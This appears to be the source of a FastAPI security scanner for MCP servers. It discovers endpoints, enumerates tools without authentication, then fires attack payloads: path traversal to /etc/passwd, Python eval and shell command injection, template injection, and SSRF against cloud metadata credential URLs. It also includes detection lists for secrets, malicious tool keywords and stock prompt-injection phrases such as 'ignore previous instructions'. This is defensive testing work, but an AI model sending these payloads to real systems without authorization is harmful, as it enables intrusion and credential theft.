"""
MCP (Model Context Protocol) Server Scanner
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Comprehensive security scanner for MCP servers.

Phases:
  1. Discovery   — probe common MCP endpoint paths (JSON-RPC + SSE)
  2. Enumeration — tools/list, resources/list, prompts/list
  3. Attack      — path traversal, RCE via eval, SSRF/URL injection
  4. Intelligence— secrets/PII in responses, malicious tool detection,
                   indirect prompt injection markers, typosquatting

Inspired by appsecco/vulnerable-mcp-servers-lab vulnerability classes.
"""

from __future__ import annotations

import asyncio
import json
import re
from typing import Annotated, Any, AsyncGenerator
from uuid import UUID

import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.core.dependencies import get_current_org_id, get_current_user
from app.models.db.user import User

router = APIRouter(prefix="/mcp-scanner", tags=["MCP Scanner"])

# ──────────────────────────────────────────────────────────────────────────────
# MCP endpoint paths to probe
# ──────────────────────────────────────────────────────────────────────────────
MCP_ENDPOINTS = [
    # Standard MCP HTTP transport (most common)
    "/messages",
    "/messages/",
    "/",
    # Named MCP paths
    "/mcp",
    "/mcp/",
    "/api/mcp",
    "/v1/mcp",
    "/mcp/v1",
    "/.well-known/mcp",
    "/claude-mcp",
    "/openai-mcp",
    "/tools",
    "/api/tools",
    "/mcp/tools",
    # RPC-style paths
    "/rpc",
    "/jsonrpc",
    "/api",
    "/api/v1",
]

# When SSE is found at these paths, also probe the corresponding message endpoint
SSE_TO_MESSAGE_MAP = {
    "/sse": ["/messages", "/messages/"],
    "/mcp/sse": ["/mcp/messages", "/mcp/messages/"],
    "/events": ["/messages", "/messages/"],
    "/mcp/events": ["/mcp/messages"],
    "/api/sse": ["/api/messages"],
    "/stream": ["/messages", "/message"],
}

MCP_SSE_ENDPOINTS = [
    "/mcp/sse",
    "/sse",
    "/events",
    "/mcp/events",
    "/api/sse",
    "/stream",
]

# ──────────────────────────────────────────────────────────────────────────────
# JSON-RPC discovery probes
# ──────────────────────────────────────────────────────────────────────────────
DISCOVERY_PROBES = [
    {
        "name": "initialize",
        "payload": {
            "jsonrpc": "2.0",
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "attacktrace-scanner", "version": "1.0"},
            },
            "id": 1,
        },
        "indicator_keys": ["protocolVersion", "serverInfo", "capabilities"],
        "severity": "high",
        "description": "Server responds to unauthenticated initialize handshake — MCP server confirmed",
        "remediation": "Add authentication (API keys, OAuth2, or IP allowlisting) before exposing the MCP endpoint.",
        "owasp": "A07 - Identification and Authentication Failures",
    },
    {
        "name": "list_tools",
        "payload": {"jsonrpc": "2.0", "method": "tools/list", "params": {}, "id": 2},
        "indicator_keys": ["tools", "result"],
        "severity": "critical",
        "description": "Unauthenticated tools/list exposes all available MCP tools and their schemas",
        "remediation": "Require authentication before exposing tool manifests. Tools describe capabilities that attackers can weaponize.",
        "owasp": "A01 - Broken Access Control",
    },
    {
        "name": "list_resources",
        "payload": {"jsonrpc": "2.0", "method": "resources/list", "params": {}, "id": 3},
        "indicator_keys": ["resources", "result"],
        "severity": "high",
        "description": "Unauthenticated resources/list may expose sensitive data sources and file paths",
        "remediation": "Restrict resource listing to authenticated sessions. Resource URIs reveal internal file structure.",
        "owasp": "A01 - Broken Access Control",
    },
    {
        "name": "list_prompts",
        "payload": {"jsonrpc": "2.0", "method": "prompts/list", "params": {}, "id": 4},
        "indicator_keys": ["prompts", "result"],
        "severity": "medium",
        "description": "Unauthenticated prompts/list exposes system prompt templates and LLM instructions",
        "remediation": "System prompts may contain confidential instructions or secrets. Protect with authentication.",
        "owasp": "A02 - Cryptographic Failures",
    },
]

# ──────────────────────────────────────────────────────────────────────────────
# Vulnerability-specific tool execution attacks
# ──────────────────────────────────────────────────────────────────────────────
TOOL_ATTACKS = [
    {
        "id": "path_traversal",
        "name": "Path Traversal",
        "severity": "critical",
        "owasp": "A01 - Broken Access Control",
        "mitre": "AML.T0057 - LLM Data Leakage",
        "description": "Attempt to read sensitive files via directory traversal in file path parameters",
        "payloads": [
            {"path": "../../../../etc/passwd"},
            {"path": "../../../etc/passwd"},
            {"path": "../../etc/passwd"},
            {"filename": "../../etc/passwd"},
            {"file_path": "../../etc/passwd"},
            {"filepath": "../../../../etc/passwd"},
            {"name": "../../../etc/passwd"},
        ],
        "success_indicators": ["root:", "daemon:", "nobody:", "/bin/bash", "/bin/sh", "/home/", "www-data"],
        "remediation": "Use os.path.basename() to strip directory components. Validate paths are within an allowed base directory using os.path.realpath(). Never pass raw user input to open().",
    },
    {
        "id": "rce_eval",
        "name": "RCE via eval()",
        "severity": "critical",
        "owasp": "A03 - Injection",
        "mitre": "AML.T0043 - Craft Adversarial Data",
        "description": "Remote code execution via Python eval() or format() injection in template/format parameters",
        "payloads": [
            {"format": "__import__('os').popen('id').read()"},
            {"format": "__import__('os').popen('whoami').read()"},
            {"template": "__import__('os').popen('id').read()"},
            {"expression": "__import__('os').getenv('HOME', 'PWNED')"},
            {"query": "'; import os; os.popen('id').read(); '"},
            {"code": "__import__('os').popen('id').read()"},
        ],
        "success_indicators": ["uid=", "gid=", "root", "www-data", "PWNED", "/root", "/home/"],
        "remediation": "Never call eval() or exec() with user-supplied input. Use ast.literal_eval() for safe expression parsing, or use proper templating engines with sandboxing (Jinja2 with sandboxed env).",
    },
    {
        "id": "ssrf",
        "name": "SSRF / URL Injection",
        "severity": "high",
        "owasp": "A10 - Server-Side Request Forgery",
        "mitre": "AML.T0057 - LLM Data Leakage",
        "description": "Server-Side Request Forgery via user-controlled URL parameters in tool calls",
        "payloads": [
            {"url": "http://169.254.169.254/latest/meta-data/"},
            {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
            {"url": "http://metadata.google.internal/computeMetadata/v1/"},
            {"url": "file:///etc/passwd"},
            {"url": "http://127.0.0.1:6379/"},  # Redis
            {"url": "http://127.0.0.1:27017/"},  # MongoDB
            {"uri": "http://169.254.169.254/latest/meta-data/"},
            {"source": "http://169.254.169.254/latest/meta-data/"},
            {"endpoint": "http://169.254.169.254/latest/meta-data/"},
        ],
        "success_indicators": [
            "ami-id", "instance-id", "instance-type", "security-credentials",
            "root:", "/bin/bash", "computeMetadata", "+OK", "MongoDB",
        ],
        "remediation": "Validate and allowlist URLs before making requests. Block RFC1918 addresses (10.x, 172.16-31.x, 192.168.x) and link-local (169.254.x.x). Use a library like ssrf-filter.",
    },
    {
        "id": "command_injection",
        "name": "Command Injection",
        "severity": "critical",
        "owasp": "A03 - Injection",
        "mitre": "AML.T0043 - Craft Adversarial Data",
        "description": "OS command injection via shell metacharacters in tool parameters",
        "payloads": [
            {"command": "id; whoami"},
            {"cmd": "id; whoami"},
            {"query": "'; id; echo '"},
            {"input": "$(id)"},
            {"args": ["--help; id"]},
            {"host": "127.0.0.1; id"},
            {"domain": "example.com; id"},
        ],
        "success_indicators": ["uid=", "gid=", "root", "www-data"],
        "remediation": "Never pass user input to subprocess.call(shell=True) or os.system(). Use subprocess with argument lists and no shell=True. Validate all inputs strictly.",
    },
    {
        "id": "template_injection",
        "name": "Server-Side Template Injection",
        "severity": "high",
        "owasp": "A03 - Injection",
        "mitre": "AML.T0043 - Craft Adversarial Data",
        "description": "Server-side template injection (SSTI) via template engine evaluation",
        "payloads": [
            {"template": "{{7*7}}"},
            {"content": "{{7*7}}"},
            {"message": "{{7*7}}"},
            {"text": "${7*7}"},
            {"body": "#{7*7}"},
            {"format": "{{'x'*49}}"},
        ],
        "success_indicators": ["49", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"],
        "remediation": "Use Jinja2 with SandboxedEnvironment. Never render user-supplied content as templates. Validate all template inputs.",
    },
]

# ──────────────────────────────────────────────────────────────────────────────
# Secrets / PII detection patterns
# ──────────────────────────────────────────────────────────────────────────────
SECRETS_PATTERNS: list[tuple[str, str, str]] = [
    # (pattern, label, severity)
    (r"sk-[A-Za-z0-9]{32,}", "OpenAI API Key", "critical"),
    (r"sk-ant-[A-Za-z0-9\-]{80,}", "Anthropic API Key", "critical"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key ID", "critical"),
    (r"(?i)aws.{0,20}secret.{0,20}['\"]([A-Za-z0-9+/]{40})['\"]", "AWS Secret Key", "critical"),
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Token", "critical"),
    (r"ghs_[A-Za-z0-9]{36}", "GitHub App Token", "critical"),
    (r"(?i)bearer\s+([A-Za-z0-9\-._~+/]{20,})", "Bearer Token", "high"),
    (r"(?i)(password|passwd|secret|api_key|apikey|api-key)\s*[=:]\s*['\"]([^'\"]{8,})['\"]", "Hardcoded Secret", "high"),
    (r"(?i)(token)\s*[=:]\s*['\"]([A-Za-z0-9_\-]{20,})['\"]", "Hardcoded Token", "high"),
    (r"\b[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b", "Potential Credit Card", "high"),
    (r"\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b", "SSN Pattern (PII)", "critical"),
    (r"(?i)private.{0,5}key.{0,20}-----BEGIN", "Private Key", "critical"),
    (r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "Private Key Material", "critical"),
    (r"(?i)smtp.{0,20}password.{0,20}['\"]([^'\"]{6,})['\"]", "SMTP Password", "high"),
    (r"(?i)database.{0,20}(password|passwd).{0,20}['\"]([^'\"]{6,})['\"]", "Database Password", "critical"),
]

# ──────────────────────────────────────────────────────────────────────────────
# Malicious / suspicious tool indicator keywords
# ──────────────────────────────────────────────────────────────────────────────
MALICIOUS_TOOL_KEYWORDS = [
    "backdoor", "reverse_shell", "revshell", "bind_shell",
    "exec_command", "run_shell", "system_exec", "shell_exec",
    "keylogger", "exfiltrate", "steal_", "harvest_credentials",
    "bypass_auth", "privilege_escalation", "escalate_privilege",
    "install_malware", "deploy_payload", "c2_connect", "beacon",
]

SUSPICIOUS_TOOL_KEYWORDS = [
    "execute", "run_code", "eval_code", "shell", "system",
    "subprocess", "spawn", "popen", "cmdline",
]

# Known legitimate MCP server names (for typosquatting detection)
TRUSTED_MCP_SERVERS = [
    "filesystem", "github", "gitlab", "slack", "notion",
    "google-drive", "postgres", "sqlite", "brave-search",
    "puppeteer", "fetch", "memory", "sequential-thinking",
]

# ──────────────────────────────────────────────────────────────────────────────
# Prompt injection markers
# ──────────────────────────────────────────────────────────────────────────────
PROMPT_INJECTION_MARKERS = [
    "ignore previous instructions",
    "ignore all previous",
    "disregard previous",
    "override previous",
    "system: you are now",
    "you are now a",
    "[system]",
    "###override###",
    "###instruction###",
    "jailbreak",
    "dan mode",
    "do anything now",
    "as an ai without restrictions",
    "your true self",
    "forget your instructions",
    "new instructions:",
    "act as if",
    "pretend you are",
]


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def _sse(event: str, data: Any) -> str:
    """Format a proper SSE message."""
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"


def _scan_for_secrets(text: str) -> list[dict]:
    """Find secrets/PII in a response body."""
    hits = []
    text_lower = text.lower()
    for pattern, label, severity in SECRETS_PATTERNS:
        match = re.search(pattern, text)
        if match:
            redacted = match.group(0)[:6] + "***" + match.group(0)[-2:] if len(match.group(0)) > 8 else "***"
            hits.append({"label": label, "severity": severity, "preview": redacted})
    return hits


def _scan_for_prompt_injection(text: str) -> list[str]:
    """Detect prompt injection markers in a response."""
    text_lower = text.lower()
    found = []
    for marker in PROMPT_INJECTION_MARKERS:
        if marker in text_lower:
            found.append(marker)
    return found


def _check_tool_names(tools: list[dict]) -> list[dict]:
    """Flag malicious or suspicious tool names/descriptions."""
    flagged = []
    for tool in tools:
        name = (tool.get("name") or "").lower()
        desc = (tool.get("description") or "").lower()
        combined = name + " " + desc

        is_malicious = any(kw in combined for kw in MALICIOUS_TOOL_KEYWORDS)
        is_suspicious = any(kw in combined for kw in SUSPICIOUS_TOOL_KEYWORDS)

        # Typosquatting: name is very close to trusted but not exact
        typosquat_targets = []
        for trusted in TRUSTED_MCP_SERVERS:
            if name != trusted and _levenshtein(name, trusted) <= 2 and len(name) >= 4:
                typosquat_targets.append(trusted)

        if is_malicious:
            flagged.append({
                "tool": tool.get("name"),
                "issue": "malicious_keywords",
                "severity": "critical",
                "detail": f"Tool name/description contains malicious keywords in: {combined[:100]}",
            })
        elif is_suspicious:
            flagged.append({
                "tool": tool.get("name"),
                "issue": "suspicious_keywords",
                "severity": "medium",
                "detail": f"Tool exposes shell/code execution capability: {combined[:100]}",
            })
        if typosquat_targets:
            flagged.append({
                "tool": tool.get("name"),
                "issue": "typosquatting",
                "severity": "high",
                "detail": f"Tool name '{name}' may be typosquatting trusted server(s): {typosquat_targets}",
            })

    return flagged


def _levenshtein(a: str, b: str) -> int:
    """Simple Levenshtein distance."""
    if len(a) < len(b):
        return _levenshtein(b, a)
    if len(b) == 0:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            curr.append(min(prev[j + 1] + 1, curr[j] + 1, prev[j] + (ca != cb)))
        prev = curr
    return prev[-1]


def _parse_mcp_response(resp: httpx.Response) -> tuple[bool, dict]:
    """Parse MCP JSON-RPC response. Returns (is_valid_mcp, body_dict)."""
    try:
        body = resp.json()
        # Valid MCP: jsonrpc 2.0, or has result/error keys, or has tools/resources
        is_mcp = (
            body.get("jsonrpc") == "2.0"
            or ("result" in body and isinstance(body.get("result"), dict))
            or ("error" in body and "code" in body.get("error", {}))
            or ("tools" in body and isinstance(body.get("tools"), list))
        )
        return is_mcp, body
    except Exception:
        return False, {}


def _extract_tools(body: dict) -> list[dict]:
    """Extract tool list from a tools/list response."""
    result = body.get("result", {})
    if isinstance(result, dict):
        return result.get("tools", [])
    return []


def _extract_resources(body: dict) -> list[dict]:
    result = body.get("result", {})
    if isinstance(result, dict):
        return result.get("resources", [])
    return []


# ──────────────────────────────────────────────────────────────────────────────
# Main scan coroutine
# ──────────────────────────────────────────────────────────────────────────────

class MCPScanRequest(BaseModel):
    target: str = ""
    target_url: str = ""
    timeout: int = 10
    check_sse: bool = True
    run_attacks: bool = True

    @property
    def resolved_target(self) -> str:
        return (self.target_url or self.target).rstrip("/")


async def _run_mcp_scan(
    target_url: str,
    timeout: int,
    check_sse: bool,
    run_attacks: bool,
) -> AsyncGenerator[str, None]:
    target = target_url.rstrip("/")

    findings: list[dict] = []
    discovered_endpoints: list[str] = []  # confirmed MCP endpoints
    all_tools: list[dict] = []            # tools enumerated from server
    all_raw_responses: list[str] = []     # all response bodies (for secrets scan)
    # Track already-confirmed endpoint URLs so we don't duplicate
    confirmed_urls: set[str] = set()

    yield _sse("start", {
        "target": target,
        "phases": ["discovery", "enumeration", "attack", "intelligence"],
        "checks": len(DISCOVERY_PROBES) * len(MCP_ENDPOINTS) + len(MCP_SSE_ENDPOINTS),
    })

    def _finding(vuln_id: str, url: str, severity: str, title: str, description: str,
                 remediation: str, owasp: str = "", mitre: str = "",
                 detail: str = "", tool_name: str = "", evidence: str = "") -> dict:
        f = {
            "type": "finding",
            "vuln_id": vuln_id,
            "url": url,
            "severity": severity,
            "title": title,
            "description": description,
            "remediation": remediation,
            "owasp": owasp,
            "mitre": mitre,
            "detail": detail,
            "tool_name": tool_name,
            "evidence": evidence[:500] if evidence else "",
        }
        findings.append(f)
        return f

    def _confirm_endpoint(url: str, body: dict, status: int) -> bool:
        """Add url to discovered_endpoints if not already there. Return True if newly added."""
        if url in confirmed_urls:
            return False
        confirmed_urls.add(url)
        discovered_endpoints.append(url)
        return True

    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=True,
        verify=False,
        headers={"User-Agent": "AttackTrace-MCP-Scanner/1.0"},
    ) as client:

        # ── Phase 1: Discovery — probe all known MCP paths ─────────────────
        yield _sse("phase_start", {"phase": "discovery", "message": f"Probing {len(MCP_ENDPOINTS)} MCP endpoint paths"})

        init_probe = DISCOVERY_PROBES[0]
        for endpoint_path in MCP_ENDPOINTS:
            url = f"{target}{endpoint_path}"
            try:
                resp = await client.post(
                    url,
                    json=init_probe["payload"],
                    headers={"Content-Type": "application/json"},
                    timeout=max(5, timeout // 2),
                )
                is_mcp, body = _parse_mcp_response(resp)
                all_raw_responses.append(resp.text)

                if resp.status_code in (404, 405, 501, 400):
                    yield _sse("probe", {"url": url, "status": resp.status_code, "result": "not_mcp"})
                    continue

                if is_mcp:
                    if _confirm_endpoint(url, body, resp.status_code):
                        server_info = {}
                        result_obj = body.get("result", {})
                        if isinstance(result_obj, dict):
                            server_info = result_obj.get("serverInfo", {})
                        yield _sse("endpoint_found", {
                            "url": url,
                            "status": resp.status_code,
                            "server_info": server_info,
                        })
                        f = _finding(
                            vuln_id="unauth_mcp_exposed",
                            url=url,
                            severity=init_probe["severity"],
                            title="Unauthenticated MCP Server Exposed",
                            description=init_probe["description"],
                            remediation=init_probe["remediation"],
                            owasp=init_probe["owasp"],
                            evidence=json.dumps(body),
                        )
                        yield _sse("finding", f)
                else:
                    yield _sse("probe", {"url": url, "status": resp.status_code, "result": "not_mcp"})

            except httpx.TimeoutException:
                yield _sse("probe", {"url": url, "result": "timeout"})
            except Exception as e:
                yield _sse("probe", {"url": url, "result": "error", "error": str(e)[:80]})

        # ── Phase 1b: SSE detection + follow-up JSON-RPC on message endpoint ─
        if check_sse:
            yield _sse("phase_start", {"phase": "sse_detection", "message": "Detecting SSE transport endpoints"})
            for sse_path in MCP_SSE_ENDPOINTS:
                sse_url = f"{target}{sse_path}"
                try:
                    async with client.stream(
                        "GET", sse_url,
                        headers={"Accept": "text/event-stream"},
                        timeout=5,
                    ) as stream:
                        ct = stream.headers.get("content-type", "")
                        is_sse = "text/event-stream" in ct
                        first_chunk = ""
                        async for chunk in stream.aiter_text():
                            first_chunk = chunk[:300]
                            break

                        if is_sse or "data:" in first_chunk:
                            f = _finding(
                                vuln_id="unauth_sse_transport",
                                url=sse_url,
                                severity="high",
                                title="Unauthenticated MCP SSE Transport Exposed",
                                description="MCP SSE transport endpoint responds without authentication. Attackers can subscribe to real-time tool call results.",
                                remediation="Add authentication middleware before the SSE endpoint.",
                                owasp="A07 - Identification and Authentication Failures",
                                evidence=first_chunk,
                            )
                            yield _sse("finding", f)

                            # Follow up: probe the corresponding JSON-RPC message endpoint
                            for msg_path in SSE_TO_MESSAGE_MAP.get(sse_path, []):
                                msg_url = f"{target}{msg_path}"
                                try:
                                    resp2 = await client.post(
                                        msg_url,
                                        json=init_probe["payload"],
                                        headers={"Content-Type": "application/json"},
                                        timeout=5,
                                    )
                                    is_mcp2, body2 = _parse_mcp_response(resp2)
                                    all_raw_responses.append(resp2.text)
                                    if is_mcp2 and _confirm_endpoint(msg_url, body2, resp2.status_code):
                                        yield _sse("endpoint_found", {
                                            "url": msg_url,
                                            "status": resp2.status_code,
                                            "server_info": {},
                                            "via": f"SSE follow-up from {sse_url}",
                                        })
                                        f2 = _finding(
                                            vuln_id="unauth_mcp_exposed",
                                            url=msg_url,
                                            severity="critical",
                                            title="Unauthenticated MCP JSON-RPC Message Endpoint",
                                            description="MCP message endpoint (used with SSE transport) is exposed without authentication.",
                                            remediation="Add authentication to the /messages endpoint. Both SSE and message endpoints must be protected.",
                                            owasp="A07 - Identification and Authentication Failures",
                                            evidence=json.dumps(body2),
                                        )
                                        yield _sse("finding", f2)
                                except Exception:
                                    pass
                except Exception:
                    pass

        # ── Phase 2: Full enumeration on all confirmed endpoints ───────────
        yield _sse("phase_start", {
            "phase": "enumeration",
            "message": f"Enumerating {len(discovered_endpoints)} confirmed endpoint(s)",
        })

        for base_url in list(discovered_endpoints):
            for probe in DISCOVERY_PROBES[1:]:  # skip initialize (done in discovery)
                try:
                    resp = await client.post(
                        base_url,
                        json=probe["payload"],
                        headers={"Content-Type": "application/json"},
                    )
                    is_mcp, body = _parse_mcp_response(resp)
                    all_raw_responses.append(resp.text)

                    if resp.status_code in (404, 405):
                        continue

                    result_obj = body.get("result") or {}
                    if not isinstance(result_obj, dict):
                        continue

                    tools = result_obj.get("tools") or []
                    resources = result_obj.get("resources") or []
                    prompts = result_obj.get("prompts") or []
                    tool_count = len(tools)
                    resource_count = len(resources)

                    if tools:
                        all_tools.extend(tools)

                    if is_mcp and (tools or resources or prompts):
                        f = _finding(
                            vuln_id=f"unauth_{probe['name']}",
                            url=base_url,
                            severity=probe["severity"],
                            title=f"Unauthenticated {probe['name'].replace('_', ' ').title()}",
                            description=probe["description"],
                            remediation=probe["remediation"],
                            owasp=probe["owasp"],
                            evidence=json.dumps(result_obj),
                        )
                        f["tool_count"] = tool_count
                        f["resource_count"] = resource_count
                        f["exposed_tools"] = [t.get("name") for t in tools[:15]]
                        yield _sse("finding", f)

                except httpx.TimeoutException:
                    pass
                except Exception:
                    pass

        # ── Phase 3: Attack phase ──────────────────────────────────────────
        # Always run if run_attacks=True; use confirmed endpoints OR probe common paths
        attack_targets = list(discovered_endpoints)
        if run_attacks:
            # Also always try common attack paths even without confirmed discovery
            blind_paths = ["/messages", "/messages/", "/mcp", "/"]
            for p in blind_paths:
                u = f"{target}{p}"
                if u not in confirmed_urls:
                    attack_targets.append(u)

            if attack_targets:
                yield _sse("phase_start", {
                    "phase": "attack",
                    "message": f"Running {len(TOOL_ATTACKS)} attack modules against {len(attack_targets)} target(s)",
                })

                # Fallback tool list if no tools were enumerated
                fallback_tools = [
                    {"name": "read_file"},
                    {"name": "write_file"},
                    {"name": "file_read"},
                    {"name": "read"},
                    {"name": "fetch"},
                    {"name": "execute"},
                    {"name": "run"},
                    {"name": "eval"},
                    {"name": "format"},
                    {"name": "query"},
                    {"name": "search"},
                ]
                tools_to_try_base = (all_tools[:8] + fallback_tools) if all_tools else fallback_tools

                for attack in TOOL_ATTACKS:
                    yield _sse("attack_start", {"attack": attack["name"], "id": attack["id"]})

                    for base_url in attack_targets:
                        for payload_params in attack["payloads"]:
                            payload_key = list(payload_params.keys())[0]

                            # Build tool list: prefer tools whose schema has the param key
                            schema_matched = [
                                t for t in tools_to_try_base
                                if payload_key in (t.get("inputSchema", {}).get("properties", {}) or {})
                            ]
                            # Always also try tools with no schema info (blind) and fallback tools
                            blind_tools = [t for t in tools_to_try_base if not t.get("inputSchema")]
                            candidates = (schema_matched or blind_tools or tools_to_try_base)[:6]

                            for tool in candidates:
                                tool_name = tool.get("name", "unknown")
                                rpc = {
                                    "jsonrpc": "2.0",
                                    "method": "tools/call",
                                    "params": {"name": tool_name, "arguments": payload_params},
                                    "id": 99,
                                }
                                try:
                                    resp = await client.post(
                                        base_url,
                                        json=rpc,
                                        headers={"Content-Type": "application/json"},
                                        timeout=8,
                                    )
                                    _, body = _parse_mcp_response(resp)
                                    response_text = resp.text
                                    all_raw_responses.append(response_text)

                                    matched = [
                                        ind for ind in attack["success_indicators"]
                                        if ind.lower() in response_text.lower()
                                    ]
                                    if matched:
                                        f = _finding(
                                            vuln_id=attack["id"],
                                            url=base_url,
                                            severity=attack["severity"],
                                            title=f"{attack['name']} — '{tool_name}' Vulnerable",
                                            description=attack["description"],
                                            remediation=attack["remediation"],
                                            owasp=attack["owasp"],
                                            mitre=attack.get("mitre", ""),
                                            tool_name=tool_name,
                                            detail=f"Payload: {json.dumps(payload_params)} | Matched: {matched}",
                                            evidence=response_text,
                                        )
                                        yield _sse("finding", f)
                                        break  # one finding per tool per attack per endpoint
                                except httpx.TimeoutException:
                                    pass
                                except Exception:
                                    pass

        # ── Phase 4: Intelligence analysis ────────────────────────────────
        yield _sse("phase_start", {"phase": "intelligence", "message": "Running intelligence analysis"})

        # 4a: Malicious/suspicious tool detection
        if all_tools:
            seen_tool_issues: set[str] = set()
            for flag in _check_tool_names(all_tools):
                key = f"{flag['tool']}:{flag['issue']}"
                if key in seen_tool_issues:
                    continue
                seen_tool_issues.add(key)

                issue = flag["issue"]
                if issue == "malicious_keywords":
                    title = f"Malicious Tool: '{flag['tool']}'"
                    desc = "Tool name/description contains known malicious keywords."
                    rem = "Remove this tool and audit the codebase for backdoors."
                elif issue == "typosquatting":
                    title = f"Typosquatting Tool: '{flag['tool']}'"
                    desc = "Tool name closely resembles a trusted MCP server — possible supply chain attack."
                    rem = "Verify tool provenance. Only install MCP servers from trusted publishers."
                else:
                    title = f"Suspicious Exec Tool: '{flag['tool']}'"
                    desc = "Tool exposes shell/code execution capabilities that could be abused."
                    rem = "Require per-request authorization for execution tools."

                f = _finding(
                    vuln_id=f"tool_{issue}",
                    url=discovered_endpoints[0] if discovered_endpoints else target,
                    severity=flag["severity"],
                    title=title,
                    description=desc,
                    remediation=rem,
                    owasp="A08 - Software and Data Integrity Failures",
                    mitre="AML.T0018 - Backdoor ML Model",
                    tool_name=flag["tool"],
                    detail=flag["detail"],
                )
                yield _sse("finding", f)

        # 4b: Secrets/PII scan across all collected responses
        combined_response = "\n".join(all_raw_responses)
        if combined_response:
            seen_secret_labels: set[str] = set()
            for hit in _scan_for_secrets(combined_response):
                if hit["label"] in seen_secret_labels:
                    continue
                seen_secret_labels.add(hit["label"])
                f = _finding(
                    vuln_id="exposed_secret",
                    url=discovered_endpoints[0] if discovered_endpoints else target,
                    severity=hit["severity"],
                    title=f"Exposed Secret: {hit['label']}",
                    description=f"MCP server response contains a {hit['label']}. Credentials exposed via unauthenticated MCP endpoints can be trivially harvested.",
                    remediation="Remove hardcoded secrets from tool responses. Use environment variables + secret managers. Rotate any exposed credentials immediately.",
                    owasp="A02 - Cryptographic Failures",
                    mitre="AML.T0057 - LLM Data Leakage",
                    detail=f"Pattern: {hit['label']}, preview: {hit['preview']}",
                )
                yield _sse("finding", f)

        # 4c: Prompt injection scan across responses + tool descriptions
        inj_corpus = combined_response + "\n" + "\n".join(json.dumps(t) for t in all_tools)
        if inj_corpus.strip():
            inj_markers = _scan_for_prompt_injection(inj_corpus)
            if inj_markers:
                f = _finding(
                    vuln_id="indirect_prompt_injection",
                    url=discovered_endpoints[0] if discovered_endpoints else target,
                    severity="high",
                    title="Indirect Prompt Injection Markers Detected",
                    description="Prompt injection markers found in MCP tool descriptions or responses. Attacker-controlled tool output can hijack LLM behavior.",
                    remediation="Sanitize all tool output before it reaches the LLM. Use content filters and structured output schemas.",
                    owasp="A03 - Injection",
                    mitre="AML.T0054 - Prompt Injection",
                    detail=f"Markers: {inj_markers[:5]}",
                )
                yield _sse("finding", f)

    # ── Summary ────────────────────────────────────────────────────────────
    sev_counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        sev_counts[f.get("severity", "info")] = sev_counts.get(f.get("severity", "info"), 0) + 1

    yield _sse("complete", {
        "target": target,
        "total_findings": len(findings),
        "endpoints_found": len(discovered_endpoints),
        "tools_enumerated": len(all_tools),
        "severity_counts": sev_counts,
        "vuln_ids": list({f["vuln_id"] for f in findings}),
        "summary": f"MCP scan complete — {len(findings)} finding(s) across {len(discovered_endpoints)} confirmed endpoint(s)",
    })


# ──────────────────────────────────────────────────────────────────────────────
# API routes
# ──────────────────────────────────────────────────────────────────────────────

@router.post(
    "/scan",
    summary="Comprehensive MCP server security scan",
    description=(
        "Runs a 4-phase MCP security scan: "
        "(1) Discovery — probe common endpoint paths, "
        "(2) Enumeration — tools/resources/prompts listing, "
        "(3) Attack — path traversal / RCE / SSRF / command injection / SSTI, "
        "(4) Intelligence — secrets detection, malicious tool analysis, prompt injection."
    ),
)
async def scan_mcp_server(
    payload: MCPScanRequest,
    current_user: Annotated[User, Depends(get_current_user)],
    org_id: UUID = Depends(get_current_org_id),
) -> StreamingResponse:
    if not payload.resolved_target:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="target or target_url is required",
        )
    return StreamingResponse(
        _run_mcp_scan(
            payload.resolved_target,
            payload.timeout,
            payload.check_sse,
            payload.run_attacks,
        ),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@router.get(
    "/vulnerabilities",
    summary="List all MCP vulnerability checks",
    description="Returns the full catalog of vulnerability checks the scanner performs.",
)
async def list_vulnerabilities(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    return {
        "discovery_probes": [
            {
                "name": p["name"],
                "severity": p["severity"],
                "description": p["description"],
                "owasp": p["owasp"],
            }
            for p in DISCOVERY_PROBES
        ],
        "attack_modules": [
            {
                "id": a["id"],
                "name": a["name"],
                "severity": a["severity"],
                "description": a["description"],
                "owasp": a["owasp"],
                "mitre": a.get("mitre", ""),
                "payload_count": len(a["payloads"]),
            }
            for a in TOOL_ATTACKS
        ],
        "intelligence_checks": [
            {"name": "Secrets / PII Detection", "patterns": len(SECRETS_PATTERNS), "severity": "critical"},
            {"name": "Malicious Tool Detection", "keywords": len(MALICIOUS_TOOL_KEYWORDS), "severity": "critical"},
            {"name": "Suspicious Tool Detection", "keywords": len(SUSPICIOUS_TOOL_KEYWORDS), "severity": "medium"},
            {"name": "Indirect Prompt Injection", "markers": len(PROMPT_INJECTION_MARKERS), "severity": "high"},
            {"name": "Typosquatting Detection", "trusted_servers": len(TRUSTED_MCP_SERVERS), "severity": "high"},
        ],
    }
